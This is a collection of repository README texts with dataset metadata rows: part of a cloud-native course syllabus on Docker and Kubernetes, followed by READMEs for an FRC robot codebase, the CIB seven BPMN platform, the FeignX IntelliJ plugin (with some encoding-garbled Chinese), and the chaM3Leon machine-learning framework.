5. **Describe the advantages of using OpenAPI for REST API documentation.**  
6. **How does Docker Compose enable multi-component application setups, and what are the benefits of externalized configuration?**  
7. **Explain the role of container networking in Docker Compose and how it facilitates service communication.**

---

## **HOMEWORK!!**

- Watch the recordings from the previous session - priority on cloud-native theory!

### **Suggested Reading & Resources**

- [Roy Fielding‚Äôs REST Dissertation](https://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm)
- [HTTP Status Codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
- [Richardson's Maturity Model](https://martinfowler.com/articles/richardsonMaturityModel.html)

## **2024 / 11 / 22 - Docker Network, Volumes & Compose**

![Polyglot Container App](/images/2024_11_22_Polyglot_Container_App.png)

### Docker Advanced: Networks, Volumes, and Compose  

### **Content Overview**  

This lecture explores advanced Docker features that are essential for managing containerized applications in cloud-native environments. Students will learn about Docker networking modes, data persistence with volumes, and orchestrating multi-container applications using Docker Compose. By mastering these topics, students will be able to design, deploy, and manage robust containerized systems effectively.  

---  
      
### **Learning Objectives**  

By the end of this lecture, students will be able to:  
1. Explain Docker's network modes and create custom networks to manage container communication.  
2. Differentiate between bind mounts and named volumes, and apply them for persistent data storage.  
3. Design and implement multi-container applications using Docker Compose.  
4. Optimize container setups by combining networking and volume management best practices.  

---  

### **Student/Review Questions**  
 
3. In a `docker-compose.yml` file, how do you define a custom network and attach services to it?  
4. What is the purpose of Docker‚Äôs internal DNS service, and how does it enhance container communication?  
5. How can you persist data for a containerized database across container restarts?

---

### **Exercises**  
1. **Networking Practice**:  
   - Create a custom Docker network and deploy two containers to communicate within it.  
   - Verify connectivity using tools like `ping` and DNS resolution.  

2. **Volume Management**:  
   - Set up named volumes for a container to persist data.  
   - Demonstrate sharing a volume between multiple containers.  

3. **Compose Application**:  
   - Build and deploy a web application with a backend database using Docker Compose.  
   - Define networks and volumes in the `docker-compose.yml` file.  

## **2024 / 11 / 29 - No lecture - Projektwoche**

## **2024 / 12 / 06 - Kubernetes Introduction**

### **Content Overview**

1. **Introduction to Kubernetes**  
   - **What is Kubernetes?**: High-level overview of Kubernetes as a container orchestration platform.  
   - **Why Kubernetes?**: Key benefits, including scalability, fault tolerance, and management of containerized applications.  

2. **Kubernetes Cluster Architecture**  
   - **Control Plane and Worker Nodes**: Explanation of the roles and responsibilities of the control plane and worker nodes in a Kubernetes cluster.  
   - **Key Components**: Overview of critical components like `kube-apiserver`, `etcd`, `kube-scheduler`, `kube-controller-manager`, and `kubelet`.  

![Kubernetes High Level Architecture](images/2024_11_11_kubernetes_architecture.png)

3. **Declarative Working Mode**  
   - **Configuration as Code**: Introduction to Kubernetes' declarative approach for managing application state using YAML manifests.  
   - **Reconciliation Loop**: How Kubernetes ensures desired state matches the actual state through its control loop.  

4. **Most Important API Objects**  
   - **Pods**: The smallest deployable unit in Kubernetes, representing one or more containers.  
   - **ReplicaSets**: Ensuring the desired number of pod replicas are running.  
   - **Deployments**: Managing updates and rollbacks for applications.  
   - **Services**: Enabling communication between pods and exposing applications to external users.

---

### **Objectives and Exercises**

*Students should be able to:*

- Explain what Kubernetes is, why it is used, and its primary benefits.  
- Describe the architecture of a Kubernetes cluster and the roles of its key components.  
- Demonstrate understanding of the declarative approach for managing applications in Kubernetes.  
- Identify and explain the purpose of key Kubernetes API objects, including pods, ReplicaSets, deployments, and services.  

---

### **Student/Review Questions**

1. **What is Kubernetes, and why is it beneficial for managing containerized applications?**  
2. **Describe the roles of the control plane and worker nodes in a Kubernetes cluster.**  
3. **What is the function of the `kube-apiserver` and `etcd` in Kubernetes?**  
4. **Explain Kubernetes‚Äô declarative working mode. How does the reconciliation loop ensure consistency?**  
5. **What is a pod in Kubernetes, and how does it differ from a container?**  
6. **How do ReplicaSets help ensure application reliability?**  
7. **What are deployments in Kubernetes, and how do they simplify updates and rollbacks?**  
8. **How do services in Kubernetes enable communication between pods and expose applications externally?**

## **2024-12-13 Kubernetes in Action**

### Different ways to access a Kubernetes environment (Public Cloud, Codespace, local (Kind, Minikube,...))

![Different Kubernetes Offerings](https://github.com/maeddes/hse-24-winter/blob/main/images/2024_12_02_Kubernetes_Options.png)

### Recap and relationship of important API objects

![K8s objects relationships](images/2024_12_13_Kubernetes_API_Object_Relationships.png)

### Defining a multi-application Kubernetes configuration - making things run and communicate

![K8s multi object definition](images/2024_12_13_Kubernetes_Multi_App_Definition.png)

### **Content Overview**  

This lecture provides an introduction to Kubernetes deployment options and revisits essential Kubernetes API objects in greater detail. Students will explore free Kubernetes trials offered by major cloud providers, local deployment tools like Minikube and Kind, and how to use Kubernetes in cloud-based IDEs like GitHub Codespaces. The session also deepens understanding of fundamental API objects such as Pods, Deployments, and Services, equipping students with practical knowledge for managing containerized applications in Kubernetes.  

---

### **Learning Objectives**  

By the end of this lecture, students will be able to:  
1. Identify and compare Kubernetes deployment options, including cloud trials and local setups.  
2. Set up a Kubernetes cluster locally using tools like Minikube or Kind, and within GitHub Codespaces.  
3. Describe the roles and relationships of basic Kubernetes API objects, including Pods, Deployments, and Services.  
4. Deploy and manage containerized applications using Kubernetes API objects.  

---  

### **Student/Review Questions**  

1. What are the advantages and limitations of using Kubernetes free trials from cloud providers compared to local tools like Minikube?  
2. How does Minikube enable Kubernetes functionality within a GitHub Codespaces environment?  
3. What is the role of a Pod in Kubernetes, and how does it differ from a Deployment?  
4. How do Services enable communication between Kubernetes Pods and external clients?  
5. How can you use a Deployment to ensure high availability for an application in Kubernetes? 

## **2024-12-20 Kubernetes Behaviour & Networking**

![Scenario 1](images/2024_12_20_Kubernetes_Scenarios_Recovery_From_Failure.png)

![Scenario 2](images/2024_12_20_Kubernetes_Scenarios_Load_Balancing.png)

![Scenario 3](images/2024_12_20_Kubernetes_Scenarios_Zero_Downtime_Update.png)

### **Content Overview**  

In this final Kubernetes lecture, wd explored key concepts to manage and scale applications effectively. The lecture covered the three main Kubernetes Service types‚ÄîClusterIP, NodePort, and LoadBalancer‚Äîand their use cases. Students also learned how to scale instances in a Deployment, achieving automatic load-balancing across Pods using a ClusterIP Service. The session demonstrated how Kubernetes handles automatic updates of applications through rolling updates in Deployments and how it ensures high availability by automatically recovering failed instances.  

---  
### **Learning Objectives**  

By the end of this lecture, students will be able to:  
1. Differentiate between the three main Kubernetes Service types: ClusterIP, NodePort, and LoadBalancer.  
2. Scale a Kubernetes Deployment to handle increased load and distribute traffic automatically across instances.  
3. Implement rolling updates in a Deployment to update applications without downtime.  
4. Explain how Kubernetes ensures application stability by automatically recovering from Pod failures.  

---  
### **Student/Review Questions**  

1. What are the differences between ClusterIP, NodePort, and LoadBalancer Services in Kubernetes?  
2. How does Kubernetes automatically distribute incoming traffic across multiple instances in a Deployment?  
3. How can you scale a Deployment to add more instances of your application?  
4. What is a rolling update in Kubernetes, and why is it important for managing application updates?  
5. How does Kubernetes detect and recover from crashed or failed Pods automatically?  
6. Why is load-balancing critical in distributed systems, and how does Kubernetes achieve this with Services?  

",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Team254/FRC-2024-Public,main,"# FRC-2024-Public
Team 254's 2024 FRC robot code for [Vortex](https://www.team254.com/first/2024/). Vortex's code is written in Java and is based off of WPILib's Java control system.

The code is divided into several packages, each responsible for a different aspect of the robot function. This README explains setup instructions, the function of each package, and some of the variable naming conventions used. Additional information about each specific class can be found in that class' Java file.

## Setup Instructions

### General
1. Clone this repo
1. Run `./gradlew` to download gradle and needed FRC/Vendor libraries
1. Run `./gradlew tasks` to see available options
1. Enjoy!

### Visual Studio Code (Official IDE)
1. Get the WPILib extension for easiest use from the VSCode Marketplace - Requires Java 11 or greater
1. In [`.vscode/settings.json`](.vscode/settings.json), set the User Setting, `java.home`, to the correct directory pointing to your JDK 11 directory

### IntelliJ
1. Run `./gradlew idea`
1. Open the `FRC-2024-Public.ipr` file with IntelliJ

### Eclipse
1. Run `./gradlew eclipse`
1. Open Eclipse and go to File > Open Projects from File System...
1. Set the import source to the `FRC-2024-Public` folder then click finish

### Basic Gradle Commands
* Run `./gradlew deploy` to deploy to the robot in Terminal (*nix) or Powershell (Windows)
* Run `./gradlew build` to build the code.  Use the `--info` flag for more details
* Run `./gradlew test` to run all of the JUnit tests

### Simulation
* To simulate the robot run `./gradlew simulateJava`
* You will need to configure your keyboard settings for 1 Xbox Controller.
* To set up 3d visualization in AdvantageScope, import the Advantage_Scope.json.
  * If the JSON import does not work, you need to set up a 3D tab as follows:
    * 3D Poses: Robot (components) : NT: ""ComponentsPoseArray""
    * 3D Poses: Robot : NT: ""Drive/Viz/Pose3d""
    * 3D Poses: Note : NT: ""NoteVisualizer""

## Code Highlights
* Controller Modes

	The robot uses controller modes to modify the controller's controls based on the modal control. The following modes are used:
  - NOT_SPECIFIED - Allows for intaking and shooting against the subwoofer, used if any problem occurs during the match
  - SPEAKER - Ground intake and aims at speaker at all times, adjusting both the turret and hood based on location
  - HP - [Source intake](src/main/java/com/team254/frc2024/command_factories/SuperstructureFactory.java#L230) by raising the elevator, poops following the same logic as POOP mode
  - POOP - Ground intake, [poop pose generated](src/main/java/com/team254/lib/util/PoopTargetFactory.java) based on obstacles and location
	- [Line-Drive](src/main/java/com/team254/lib/util/PoopTargetFactory.java#L80) - when close to poop point without stage in the way
	- [Shallow vs Deep Amp Lob Pass](src/main/java/com/team254/frc2024/RobotContainer.java#L538) - changes location of lob pass based on controller input
  - [CLIMB](src/main/java/com/team254/frc2024/command_factories/SuperstructureFactory.java#L393) - raises climb arms, stages amp and elevator for trap, then climbs

* Branching Auto with Choreo

	In autonomous, the robot uses Choreo and [branching autos](src/main/java/com/team254/frc2024/commands/autocommands/BranchingAutoInterrupt.java) to customize each autonomous based on multiple selectors. At the midline, the robot decides between switching to another note if it did not pick up the current note, scoring the note and going to the next note, or initiating the last action. The following selectors are used before the match:
  - Starting Location - starting location of the robot, including Truss, Speaker, Source, SpeakerCorner, Amp
  - First Action - first action of the robot, including Three Close to Midline, One Close to Midline, Sprint to Midline, and Sprint to Midline No Preload
  - Priority Midline Sequence - sequence of midline notes to target in order, such as ABC, BAC, and EDC. A is the note closest to the Amp, and E is closest to the Source.
  - Last Action - last action of the robot, including Backoff, Score Preload, and Three Close
  - Blocked Notes - Midline notes that the robot should not branch off to - used if another robot in the alliance is targeting other notes


	Choreo is used to create all our paths (Open [.chor file](autopaths.chor) in Choreo), including midline note-to-note branching, scoring, and first and last actions. Paths to midline notes are interrupted when the intake banner sensor is triggered.

* AdvantageScope Simulation

	We used AdvantageScope to simulate subsystem movements and test new software, especially autonomous paths, without the need for the robot. We also visualized logs and live robot telemetry, including note projectile simulation. We imported the robot 3D model with a fully articulating Turret, Hood, Amplifier, and Climber, along with accurate moments of inertia and gear ratios to accurately visualize robot actions. 	 

	We also used AdvantageKit to log all important data to replay after each match. This included vision estimates, robot state values, and subsystem values. This helped to isolate issues after the match, including localization and other robot malfunctions.

* Auto-Aiming to Goal

	Our robot auto-aligns the hood and turret to goal in both Poop mode and Speaker mode. In [poop mode](src/main/java/com/team254/lib/util/ShooterSetpoint.java#L117), we calculate the optimal hood and turret setpoints to reach the target poop pose, considering the constraints of the hood and the desired apex height. In [speaker mode](src/main/java/com/team254/lib/util/ShooterSetpoint.java#L203), we determine the note launch speed based on the distance from target, and use motion and lift compensation to accurately represent the note‚Äôs trajectory when the robot is in motion. We wait until all subsystems are [on target](src/main/java/com/team254/frc2024/command_factories/AimFactory.java#L50) for goal before releasing, including the shooter RPS, the turret position, and hood position.

## Package Functions
- [`com.team254.frc2024`](src/main/java/com/team254/frc2024)

	Contains the robot's central functions and holds a class with all numerical constants used throughout the code (see [`Constants.java`](src/main/java/com/team254/frc2024/Constants.java)). For example, the [`RobotContainer`](src/main/java/com/team254/frc2024/RobotContainer.java) class controls all routines depending on the robot mode. In addition, the [`RobotState`](src/main/java/com/team254/frc2024/RobotState.java) class keeps track of the current position of the robot's various frames of reference.

- [`com.team254.frc2024.command_factories`](src/main/java/com/team254/frc2024/command_factories)

	Contains all command factories with methods that call groups of subsystem commands.

- [`com.team254.frc2024.commands`](src/main/java/com/team254/frc2024/commands)

	Contains all autonomous commands and other complex subsystem commands.

- [`com.team254.frc2024.controlboard`](src/main/java/com/team254/frc2024/controlboard)

	Contains code for the driver to use either joysticks with operator gamepad or single gamepad. Also contains modal controls to switch between controller modes.

- [`com.team254.frc2024.simulation`](src/main/java/com/team254/frc2024/simulation)

	Contains code for simulated robot state, including the note state and robot position.

- [`com.team254.frc2024.subsystems`](src/main/java/com/team254/frc2024/subsystems)

	Contains the code for all subsystems. Each subsystem extends [`ServoMotorSubsystem`](src/main/java/com/team254/lib/subsystems/ServoMotorSubsystem.java) and includes an simulation and hardware interface for I/O operations.

- [`com.team254.lib.auto`](src/main/java/com/team254/lib/auto)

	Contains auto utility class to generate autonomous trajectories and commands.

- [`com.team254.lib.ctre.swerve`](src/main/java/com/team254/lib/ctre/swerve)

	Contains forked CTRE swerve classes for custom drive configs.

- [`com.team254.lib.drivers`](src/main/java/com/team254/lib/drivers)

	Contains CAN device ID class, pairing device number and bus name.

- [`com.team254.lib.limelight`](src/main/java/com/team254/lib/limelight)

	Contains Limelight helpers class for reading from NetworkTables.

- [`com.team254.lib.motion`](src/main/java/com/team254/lib/motion)

	Contains all motion profiling code used for autonomous driving. Trapezoidal motion profiles are used for smooth acceleration and minimal slip.

- [`com.team254.lib.loops`](src/main/java/com/team254/lib/loops)

	Contains a thread loop for running a set of callbacks at a Hz driven by the update frequency of CTRE Status Signals.

- [`com.team254.lib.pathplanner`](src/main/java/com/team254/lib/pathplanner)

	Contains forked Pathplanner classes improve PID controller, velocity feedback, and acceleration feedforward.

- [`com.team254.lib.subsystems`](src/main/java/com/team254/lib/subsystems)

	Contains servo motor subsystem template to be extended by all subsystems.

- [`com.team254.lib.time`](src/main/java/com/team254/lib/time)

	Contains robot time.

- [`com.team254.lib.util`](src/main/java/com/team254/lib/util)

	Contains a collection of assorted utilities classes used in the robot code. Check each file for more information.

## Variable Naming Conventions
- k*** (i.e. `kDriveWheelbaseMeters`): Final constants, especially those found in the [`Constants.java`](src/main/java/com/team254/frc2024/Constants.java) file
",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0
cibseven/cibseven,main,"# CIB seven - The open source BPMN platform

[![cibseven manual latest](https://img.shields.io/badge/manual-latest-brown.svg)](https://docs.cibseven.org/manual/latest/) [![License](https://img.shields.io/github/license/cibseven/cibseven?color=blue&logo=apache)](https://github.com/cibseven/cibseven/blob/master/LICENSE) [![Discussions](https://img.shields.io/badge/discussions-cibseven-green)](https://github.com/orgs/cibseven/discussions)

CIB seven is a flexible framework for workflow and process automation. Its core is a native BPMN 2.0 process engine that runs inside the Java Virtual Machine. It can be embedded inside any Java application and any Runtime Container. It integrates with Java EE 6 and is a perfect match for the Spring Framework. On top of the process engine, you can choose from a stack of tools for human workflow management, operations and monitoring.

- Web Site: https://cibseven.org
- Getting Started: https://docs.cibseven.org/get-started/
- Discussions: https://github.com/orgs/cibseven/discussions
- Issue Tracker: https://github.com/cibseven/cibseven/issues

## Components

CIB seven provides a rich set of components centered around the BPM lifecycle.

#### Process Implementation and Execution

- Engine - The core component responsible for executing BPMN 2.0 processes.
- REST API - The REST API provides remote access to running processes.
- Spring, CDI Integration - Programming model integration that allows developers to write Java Applications that interact with running processes.

#### Process Design

- Camunda Modeler - A [standalone desktop application](https://github.com/camunda/camunda-modeler) that allows business users and developers to design & configure processes.

#### Process Operations

- Engine - JMX and advanced Runtime Container Integration for process engine monitoring.
- Cockpit - Web application tool for process operations.
- Admin - Web application for managing users, groups, and their access permissions.

#### Human Task Management

- Tasklist - Web application for managing and completing user tasks in the context of processes.

#### And there's more...

- [bpmn.io](https://bpmn.io/) - Toolkits for BPMN, CMMN, and DMN in JavaScript (rendering, modeling)
- [Community Extensions](https://docs.cibseven.org/manual/latest/introduction/extensions/) - Extensions on top of CIB seven provided and maintained by our great open source community

## A Framework

In contrast to other vendor BPM platforms, CIB seven strives to be highly integrable and embeddable. We seek to deliver a great experience to developers that want to use BPM technology in their projects.

### Highly Integrable

Out of the box, CIB seven provides infrastructure-level integration with Java EE Application Servers and Servlet Containers.

### Embeddable

Most of the components that make up the platform can even be completely embedded inside an application. For instance, you can add the process engine and the REST API as a library to your application and assemble your custom BPM platform configuration.

## Contributing

Please see our [contribution guidelines](CONTRIBUTING.md) for how to raise issues and how to contribute code to our project.

## Tests

To run the tests in this repository, please see our [testing tips and tricks](TESTING.md).


## License

The source files in this repository are made available under the [Apache License Version 2.0](./LICENSE).

CIB seven uses and includes third-party dependencies published under various licenses. By downloading and using CIB seven artifacts, you agree to their terms and conditions. Refer to https://docs.cibseven.org/manual/latest/introduction/third-party-libraries/ for an overview of third-party libraries and particularly important third-party licenses we want to make you aware of.
",3,1,143,Apache-2.0,10,38.0,1.0,10.0,1.0,12.0,0.0,-7.6,22130.0
Halfmoonly/feignx-plugin,main,"<div align=""center"">
  <img src=""./feignx/src/main/resources/META-INF/pluginIcon.svg"" height=""64"">
  <h2>FeignX</h2>
</div>

## Ë¥°ÁåÆËÄÖ

<a href=""https://github.com/Halfmoonly/feignx-plugin/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=Halfmoonly/feignx-plugin"" />
</a>


## ‰ΩøÁî®ÊïôÁ®ã
Â∑≤‰∏äÊû∂ideaÊèí‰ª∂Â∏ÇÂú∫Ôºöhttps://plugins.jetbrains.com , ÊêúÁ¥¢FeignX‰∏ãËΩΩÂÆâË£ÖÔºåËßâÂæóÂ•ΩÁî®ÔºåÁÇπ‰∏™star‚≠ê

---
<div align=""center"">
  <img src=""./feignx/pics/ReadmeMarketplace.png"">
  <p>Marketplace</p>
</div>


FeignX is a SpringCloud OpenFeign Assistant

FeignX is inspired by IDEA's star plugin MybatisX.

You can flexibly jump back and forth between FeignClient and remote service ApiController cross-module,through method-level navigation gutter `bird`.

eg. feignClient -> ApiController
<div align=""left"">
  <img src=""./feignx/pics/f2c.png"">
</div>

eg. ApiController -> feignClient
<div align=""left"">
  <img src=""./feignx/pics/c2f.png"">
</div>

Most importantly, FeignX supports configuration file parsingÔºåsuch as yml/yaml/properties of

1.server.servlet.context-path 

2.spring.mvc.servlet.path

FeignX is sufficiently accurate than other feign plugins on the market, after many rounds of optimization.

So, install the FeignX plugin as soon as possible!.
## ÁâàÊú¨Ëø≠‰ª£
### Feignx:v1.0.0
cross-moduleÔºöFeignClient-ApiController Mutually Navigation

cross-moduleÔºöApiController-FeignClient Mutually Navigation

### Feignx:v2.1.0
Adapted To Latest IDEA

### Feignx:v3.0.0

[fix]üêû Major version fix , fix the bug that cannot dynamically detect new interfaces due to cache

### Feignx:v4.0.0
adapted properties/yml/yaml of 1.server.servlet.context-path and 2.spring.mvc.servlet.path
![DispatcherServlet.png](feignx/pics/DispatcherServlet.png)

Âú® Spring Boot Âá∫Áé∞‰πãÂâçÔºåDispatcher Servlet ÊòØÂú® web.xml Êñá‰ª∂‰∏≠Â£∞ÊòéÁöÑÔºåÂ¶Ç‰∏ãÂõæ
```xml
<web-app>
   <servlet>
         <servlet-name>example</servlet-name> 
        <servlet class> 
             org.springframework.web.servlet.DispatcherServlet 
        </servlet-class> 
        <load-on-startup>1</load -on-startup> 
    </servlet>
   <servlet-mapping>
        <servlet-name>test</servlet-name> 
        <url-pattern>*.test</url-pattern> 
   </servlet-mapping>
 </web-app>
```

Ëøô‰∏™DispatcherServletÊòØÂÆûÈôÖÁöÑServletÔºåÂÆÉÁªßÊâøËá™Âü∫Á±ªHttpServlet„ÄÇ

Âú® Spring Boot Âá∫Áé∞‰πãÂêéÔºåspring-boot-starter-web starter Ëá™Âä®Ë£ÖÈÖçÊú∫Âà∂Â∞ÜDispatcherServletÈªòËÆ§ÈÖçÁΩÆ‰∏∫ URL Ê®°Âºè‚Äú/‚Äù„ÄÇ

‰ΩÜÊòØÔºåÂ¶ÇÊûúÈúÄË¶ÅÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®Ëá™ÂÆö‰πâ URL Ê®°Âºè„ÄÇapplication.propertiesÊñá‰ª∂‰∏≠Â¶Ç‰∏ã
```properties
server.servlet.context-path=/hello
spring.mvc.servlet.path=/world
```

ÈÄöËøá‰∏äÈù¢ÁöÑÈÖçÁΩÆÔºåDispatcherServletË¢´ÈÖçÁΩÆ‰∏∫Â§ÑÁêÜ URL Ê®°Âºè/worldÔºåÂπ∂‰∏îspringbootÊ†π‰∏ä‰∏ãÊñáË∑ØÂæÑÂ∞ÜÊòØ/hello„ÄÇÂõ†Ê≠§ÔºåDispatcherServletÁõëÂê¨http://ip/port/hello/worldÔºåÔºåas prefix path by @FeignClientÔºåthe sample is below
```java
@FeignClient(path = ""/hello/world"",value = ""cloud-feign-server"", contextId = ""user"", configuration = UserConfiguration.class)
public interface UserClient {

    @GetMapping(value = ""/user/get/{id}"")
    User getUserById(@PathVariable(""id"") Long id);
}
```


yml/yamlÈÖçÁΩÆÂêå‰∏ä„ÄÇ

![feignxAction.png](feignx/src/main/resources/icons/feignxAction.png)
### Feignx:v4.1.1

feignxÈÄÇÈÖç‰∫ÜÊúÄÊñ∞ÁâàIDEAÁöÑLight‰∏ªÈ¢òÔºåÊ¨¢ËøéÂú®IDEAÂÜÖÂú®Á∫øÊõ¥Êñ∞Ëá≥4.1.1ÁâàÊú¨Ôºà‰∏âÂ§©Âêé‰∏äÁ∫øÔºâÔºåÊàñËÄÖÊèêÂâçÂÆâË£ÖÁ¶ªÁ∫øÁâà‰ΩìÈ™åÔºÅ
https://github.com/lyflexi/feignx-plugin/releases/tag/v4.1.1

![light-theme.png](feignx/pics/light-theme.png)

ÊÑüË∞¢ÂÆòÊñπÂ∑•‰Ωú‰∫∫ÂëòÁöÑÊåáÂºïÔºöNatalia Melnikova (JetBrains Marketplace) marketplace@jetbrains.com

ÊÑüË∞¢Á§æÂå∫ÁöÑÂ∏ÆÂä©‰∏éÊèêÁ§∫Ôºöhttps://intellij-support.jetbrains.com/hc/en-us/community/posts/22814305825042-Why-don-t-pluginIcon-svg-appear-in-Light-theme?page=1#community_comment_22848980293394

ÊÑüË∞¢@yann CebronÔºöhttps://intellij-support.jetbrains.com/hc/en-us/profiles/1283051161-Yann-Cebron

ÂºÄÂèëÁ§æÂå∫Ôºöhttps://intellij-support.jetbrains.com/hc/en-us/community/topics/200366979-IntelliJ-IDEA-Open-API-and-Plugin-Development

### Feignx:v4.1.3
thanks my friend's pr : https://github.com/Halfmoonly/feignx-plugin/pull/9
1. Adapted bootstrap.properties/bootstrap.yml/bootstrap.yaml
2. Adapted many writtings of pathÔºåas @FeignClient(path = ""/sys"") and @FeignClient(path = ""sys"") and @FeignClient(path = ""sys/"")


### Feignx:v4.1.5
ÊûÅÂ∞ëÊï∞ÂàÜÂ∏ÉÂºèÂú∫ÊôØ‰∏ãÁöÑnacosÈúÄË¶Å‰ª•‰∏ãÈÖçÁΩÆÔºåÂæÄÂæÄ‰ºöÈÖçÁΩÆÂú®Êú¨Âú∞ÁöÑbootstrap.yml/yaml‰∏≠ÔºåËÄåÈùûapplication.yml/yaml‰∏≠

1. server.servlet.context-path = /hello
2. spring.mvc.servlet.path = /world

Ê≠§ÁâàÊú¨‰øÆÂ§ç‰∫ÜFeignXËØªÂèñÊú¨Âú∞bootstrap.yml/yaml‰∏≠‰∏äËø∞ÈÖçÁΩÆÂ§±ÊïàÁöÑÈóÆÈ¢ò

### Feignx:v4.1.6
FeignX 4.1.5 is binary incompatible with IntelliJ IDEA Ultimate IU-193.7288.26 due to the following problem Method not found . This can lead to NoSuchMethodError exception at runtime.

Feignx:v4.1.6 resolve IntelliJ IDEA Ultimate 2019.3.51 compatibility problem.

- remove 1 usage of deprecated API (V1.381)
- Invocation of unresolved method PsiEditorUtil.findEditor(PsiElement)
- Method SearchControllerAction.navigateToControllerCode(...) contains an invokestatic instruction referencing an unresolved method PsiEditorUtil.findEditor(PsiElement).


--- 


ËßâÂæóÂ•ΩÁî®ÔºåÁÇπ‰∏™star‚≠ê
",11,3,2,Apache-2.0,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Smart-Shaped/chaM3Leon,public,"# chaM3Leon

A modular and scalable framework designed to support machine learning applications - emphasising transparency, interoperability, and usability. It implements a custom lambda architecture, and additional components designed to tackle the limitation of the Speed-Batch coupling for data ingestion and processing.

The chaM3Leon architecture is illustrated in the following Component Diagram, highlighting the connections between layers through provided and required interfaces.

![chaM3Leon architecture](docs/chaM3LeonCD.png)

As of now, we have released three layers (Batch Layer, Speed Layer, and ML Layer). You can refer to our [roadmap](#roadmap) to see the planned release dates for other components.

To implement your own version of any abstract layer you have to:

- Build the project running at the level of the chaM3Leon pom.xml the following command:
```bash
mvn clean install
```
- Generate a Maven project and add chaM3Leon as dependency on your maven pom.xml as below: 

```bash
<dependency>
	<groupId>com.smartshaped</groupId>
	<artifactId>chameleon</artifactId>
	<version>0.0.1</version>
</dependency>
```
- Add the maven-shade-plugin to generate a shaded jar in order to submit your layer implementation as a Spark application (keep in mind the framework is based on Java 11)

```bash
<build>
	<plugins>
		<plugin>
			<groupId>org.apache.maven.plugins</groupId>
			<artifactId>maven-shade-plugin</artifactId>
			<version>3.6.0</version>
			<executions>
				<execution>
					<phase>package</phase>
					<goals>
						<goal>shade</goal>
					</goals>
					<configuration>
						<filters>
							<filter>
								<artifact>*:*</artifact>
								<excludes>
									<exclude>META-INF/*.SF</exclude>
									<exclude>META-INF/*.DSA</exclude>
									<exclude>META-INF/*.RSA</exclude>
								</excludes>
							</filter>
						</filters>
						<transformers>
							<transformer
									implementation=""org.apache.maven.plugins.shade.resource.AppendingTransformer"">
									<resource>
										META-INF/services/org.apache.spark.sql.sources.DataSourceRegister
									</resource>
							</transformer>
						</transformers>
					</configuration>
				</execution>
			</executions>
		</plugin>
	</plugins>
</build>
```

After this, you can choose to extend any of the following layers:

- [Batch Layer](#batch-layer-documentation)
- [Speed Layer](#speed-layer-documentation)
- [ML Layer](#ml-layer-documentation)

# Batch Layer Documentation

## How to Develop a Batch Application

To develop a batch application using the Batch Layer, follow these steps:

### 1. Create a Class that Extends `com.smartshaped.chameleon.batch.BatchLayer`
- Ensure that the class constructor is **public**.

### 2. Create one or more Classes that Extend `com.smartshaped.chameleon.preprocessing.Preprocessor`
- Declare this class in the YAML file along with the kafka topics configurations (batch.kafka.topics.<topic_name>.class).
- Override the `preprocess` method to add custom preprocessing for the incoming streaming data.
- You can define a Preprocessor for each of the declared kafka topics.

### 3. Create a Class that Extends `com.smartshaped.chameleon.batch.BatchUpdater`
- Ensure that the class constructor is **public**.
- This is an optional step, create this class if you want to export some analysis/statisctics from your data.
- Declare this class in the YAML file (batch.updater.class).
- Override the `updateBatch` method to implement the specific logic (working on Spark Dataframe).
- It will automatically save results on Cassandra DB.

### 4. Create a Class that Extends `com.smartshaped.chameleon.common.utils.TableModel`
- Define the table fields as class attributes.
- Specify the name of the primary key as a **string**.
- Create a `typeMapping.yml` file to define the mapping between Java field types and CQL (Cassandra Query Language) types.
- Declare this class in the YAML file (batch.cassandra.model.class).

### 5. Create a Class Containing the `main` Method
- Call the `start` method of `BatchLayer` inside the `main` method.
- Specify this class in the `spark-submit` command.

---

# Speed Layer Documentation

## How to Develop a Speed Application

To develop a batch application using the Speed Layer, follow these steps:

### 1. Create a Class that Extends `com.smartshaped.chameleon.speed.SpeedLayer`
- Ensure that the class constructor is **public**.

### 2. Create a Class that Extends `com.smartshaped.chameleon.speed.SpeedUpdater`
- Ensure that the class constructor is **public**.
- This class permits you to export some partial analysis/statistics from your streaming data arrived during a window time.
- Declare this class in the YAML file (speed.updater.class).
- Override the `updateSpeed` method to implement the specific logic (working on Spark Dataframe).
- It will automatically save results on Cassandra DB.

### 3. Create a Class that Extends `com.smartshaped.chameleon.common.utils.TableModel`
- Define the table fields as class attributes.
- Specify the name of the primary key as a **string**.
- Create a `typeMapping.yml` file to define the mapping between Java field types and CQL (Cassandra Query Language) types.
- Declare this class in the YAML file (speed.cassandra.model.class).

### 4. Create a Class Containing the `main` Method
- Call the `start` method of `SpeedLayer` inside the `main` method.
- Specify this class in the `spark-submit` command.

---

# ML Layer Documentation

## How to Develop an ML Application

To develop a machine learning application using the ML Layer, follow these steps:

### 1. Create a Class that Extends `com.smartshaped.chameleon.ml.MLLayer`
- Ensure that the class constructor is **public**.

### 2. Create at Least One Class that Extends `com.smartshaped.chameleon.ml.HdfsReader`
- Ensure that the class constructor is **public**.
- Declare this class in the YAML file along with the HDFS path from which the data will be read.
- Optionally, override the `processRawData` method to add custom processing for the raw data.

### 3. Create a Class that Extends `com.smartshaped.chameleon.ml.Pipeline`
- Declare this class in the YAML file.
- Override the `start` method to implement the specific machine learning logic. 
  - Ensure that the `setModel` and `setPredictions` methods are called at the end of the pipeline.

### 4. Create a Class that Extends `com.smartshaped.chameleon.ml.ModelSaver`
- Ensure that the class constructor is **public**.
- Declare this class in the YAML file.

### 5. Create a Class that Extends `com.smartshaped.chameleon.common.utils.TableModel`
- Define the table fields as class attributes.
- Specify the name of the primary key as a **string**.
- Create a `typeMapping.yml` file to define the mapping between Java field types and CQL (Cassandra Query Language) types.
- Declare this class in the YAML file.

### 6. Create a Class Containing the `main` Method
- Call the `start` method of `MLLayer` inside the `main` method.
- Specify this class in the `spark-submit` command.

---

# Execution Instructions

To generate the `.jar` file, run the following command from your project directory:

```bash
mvn clean install
```

Then, follow the [Docker documentation](/docker_chaM3Leon/README.md)

---

# Roadmap

- Harvester (JAN 2025)

- API Gateway (MAR 2025)

- Serving Layer (Q2 2025)

- Workflow Designer (To be determined, probably Q3 2025)
